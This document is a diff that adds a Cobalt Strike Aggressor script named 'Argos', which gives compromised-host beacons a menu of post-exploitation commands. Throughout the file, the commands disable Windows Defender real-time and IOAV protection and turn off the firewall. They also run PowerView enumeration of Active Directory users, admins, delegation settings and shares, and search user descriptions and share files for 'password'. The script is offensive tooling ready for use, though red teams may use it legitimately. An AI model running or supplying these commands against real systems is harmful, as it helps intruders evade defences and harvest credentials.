@@ -1,0 +1,237 @@
+## Antivirus functions
+# Disable Windows Defender
+sub disableWindowsDefender {
+    bpowerpick($1, "Set-MpPreference -DisableRealtimeMonitoring $true");
+}
+
+# # Disable Windows Defender IOAV
+sub disableWindowsDefenderIOAV {
+    bpowerpick($1, "Set-MpPreference -DisableIOAVprotection $true -Verbose");
+}
+
+# search for a service named “windefend” and return its current state.
+sub getWindowsDefenderStatus {
+    bpowerpick($1, "sc query windefend");
+}
+
+## Firewall functions
+# Disable Firewall
+sub disableFirewall {
+    bpowerpick($1, "netsh firewall set opmode disable");
+}
+
+# Show Firewall Status
+sub showFirewallStatus {
+    bpowerpick($1, "netsh firewall show state");
+}
+
+# Show firewall configuration
+sub showFirewallConfig {
+    bpowerpick($1, "netsh firewall show config");
+}
+
+## PowerView functions for Cobalt Strike
+# Define functions for local admin enumeration
+sub invokeEnumerateLocalAdmin {
+    bpowerpick($1, "Invoke-EnumerateLocalAdmin");
+}
+
+sub invokeEnumerateLocalAdminSelectAccountName {
+    bpowerpick($1, "Invoke-EnumerateLocalAdmin | select AccountName");
+}
+
+# Define functions for user enumeration
+sub getNetUser {
+    bpowerpick($1, "Get-NetUser");
+}
+
+sub getNetUserCN {
+    bpowerpick($1, "Get-NetUser | select cn");
+}
+
+sub getNetUserSamAccountName {
+    bpowerpick($1, "Get-NetUser | select samaccountname");
+}
+
+sub getNetUserExpandSamAccountName {
+    bpowerpick($1, "Get-NetUser | select -expandproperty samaccountname");
+}
+
+sub getNetUserDescription {
+    bpowerpick($1, "Get-NetUser | select description");
+}
+
+sub findUserFieldPassword {
+    bpowerpick($1, "find-userfield -SearchField description \"password\"");
+}
+
+sub findUserFieldAdmin {
+    bpowerpick($1, "find-userfield -SearchField description \"admin\"");
+}
+
+sub getUserProperty {
+    bpowerpick($1, "Get-UserProperty");
+}
+
+sub getUserPropertyPwdLastSet {
+    bpowerpick($1, "Get-UserProperty -Properties pwdlastset");
+}
+
+sub getUserPropertyLogonCount {
+    bpowerpick($1, "Get-UserProperty -Properties logoncount");
+}
+
+sub getUserPropertyBadPwdCount {
+    bpowerpick($1, "Get-UserProperty -Properties badpwdcount");
+}
+
+sub listAllRDPUsers {
+    bpowerpick($1, "Get-NetGroupMember -GroupName RDPUsers");
+}
+
+# Define functions for computer enumeration
+sub getNetComputer {
+    bpowerpick($1, "Get-NetComputer");
+}
+
+sub getNetComputerFullData {
+    bpowerpick($1, "Get-NetComputer -FullData");
+}
+
+sub getDomainComputerDnsHostname {
+    bpowerpick($1, "Get-DomainComputer | select -ExpandProperty dnshostname");
+}
+
+sub getNetComputerCNandOS {
+    bpowerpick($1, "Get-NetComputer | Select cn,OperatingSystem");
+}
+
+sub listComputersByOS_Windows7 {
+    bpowerpick($1, "Get-NetComputer -OperatingSystem '*Windows 7'");
+}
+
+sub listComputersByOS_Windows10 {
+    bpowerpick($1, "Get-NetComputer -OperatingSystem '*Windows 10'");
+}
+
+sub listComputersByOS_Server2016 {
+    bpowerpick($1, "Get-NetComputer -OperatingSystem '*server 2016'");
+}
+
+sub listComputersByOS_Server2019 {
+    bpowerpick($1, "Get-NetComputer -OperatingSystem '*server 2019'");
+}
+
+sub listComputerUnconstrainedDelegation {
+    bpowerpick($1, "Get-NetComputer -Unconstrained | select -ExpandProperty name");
+}
+
+# Find Servers that has uncontrained delegation
+
+
+# Define functions for share enumeration
+sub invokeEnumerateShares {
+    bpowerpick($1, "Invoke-ShareFinder");
+}
+
+sub enumerateDomainShares {
+    bpowerpick($1, "Find-DomainShare");
+}
+
+sub enumerateSharesWithAccess {
+    bpowerpick($1, "Find-DomainShare -CheckShareAccess");
+}
+
+sub enumerateInterestingFiles {
+    bpowerpick($1, "Find-InterestingDomainShareFile -Include *passwords*");
+}
+
+# Define functions for file enumeration
+sub invokeFileFinder {
+    bpowerpick($1, "Invoke-FileFinder");
+}
+
+sub invokeFileFinderSelectFullName {
+    bpowerpick($1, "Invoke-FileFinder | select FullName");
+}
+
+# Define functions for GPO enumeration
+sub enumerateGPOVerbose {
+    bpowerpick($1, "Get-NetGPOGroup -Verbose");
+}
+
+sub getDomainGPO {
+    bpowerpick($1, "Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName");
+}
+
+sub getNetGPO {
+    bpowerpick($1, "Get-NetGPO");
+}
+
+sub listAllOUs {
+    bpowerpick($1, "Get-NetOU");
+}
+
+# Create the Argos submenu with nested submenus for various tasks
+popup beacon_top {
+    menu "Argos" {
+        menu "Antivirus"{
+            item "Disable Windows Defender" { disableWindowsDefender($1); }
+            item "Disable Windows Defender IOAV" { disableWindowsDefenderIOAV($1); }
+            item "Get Windows Defender Status" { getWindowsDefenderStatus($1); }
+        }
+        menu "Firewall"{
+            item "Disable Firewall" { disableFirewall($1); }
+            item "Show Firewall Status" { showFirewallStatus($1); }
+            item "Show Firewall Configuration" { showFirewallConfig($1); }
+
+        }
+        menu "PowerView" {
+            menu "Enumerate Local Admins" {
+                item "Enumerate all local admins" { invokeEnumerateLocalAdmin($1); }
+                item "List local admins account names" { invokeEnumerateLocalAdminSelectAccountName($1); }
+            }
+            menu "Enumerate Users" {
+                item "Dump all users and information" { getNetUser($1); }
+                item "List usernames (CN)" { getNetUserCN($1); }
+                item "List usernames (SamAccountName)" { getNetUserSamAccountName($1); }
+                item "List usernames (expanded SamAccountName)" { getNetUserExpandSamAccountName($1); }
+                item "List user descriptions" { getNetUserDescription($1); }
+                item "Search descriptions for 'password'" { findUserFieldPassword($1); }
+                item "Search descriptions for 'admin'" { findUserFieldAdmin($1); }
+                item "Show all user properties" { getUserProperty($1); }
+                item "Show password last set date" { getUserPropertyPwdLastSet($1); }
+                item "Show user login count" { getUserPropertyLogonCount($1); }
+                item "Show bad password count" { getUserPropertyBadPwdCount($1); }
+                item "List all RDP Users" { listAllRDPUsers($1); }
+            }
+            menu "Enumerate Computers" {
+                item "List all workstations in the domain" { getNetComputer($1); }
+                item "Get detailed information on all domain computers" { getNetComputerFullData($1); }
+                item "List DNS hostnames of domain computers" { getDomainComputerDnsHostname($1); }
+                item "List computer names and operating systems" { getNetComputerCNandOS($1); }
+                item "List Windows 7 computers" { listComputersByOS_Windows7($1); }
+                item "List Windows 10 computers" { listComputersByOS_Windows10($1); }
+                item "List Windows Server 2016 computers" { listComputersByOS_Server2016($1); }
+                item "List Windows Server 2019 computers" { listComputersByOS_Server2019($1); }
+                item "List computers with unconstrained delegation" { listComputerUnconstrainedDelegation($1); }
+            }
+            menu "Enumerate Shares" {
+                item "Invoke Module ShareFinder" { invokeEnumerateShares($1); }
+                item "Enumerate Domain Shares" { enumerateDomainShares($1); }
+                item "Enumerate Shares that current User has Access" { enumerateSharesWithAccess($1); }
+                item "Enumerate Files that include *passwords*" { enumerateInterestingFiles($1); }
+            }
+            menu "Enumerate Files" {
+                item "Invoke Module FileFinder" { invokeFileFinder($1); }
+                item "List full names of found files" { invokeFileFinderSelectFullName($1); }
+            }
+            menu "GPO Enumeration" {
+                item "Enumerate GPOs (Verbose)" { enumerateGPOVerbose($1); }
+                item "List the names of the policies" { getDomainGPO($1); }
+                item "List all policies with details" { getNetGPO($1); }
+                item "List all Organization Units" { listAllOUs($1); }
+            }
+        }
+    }
+}
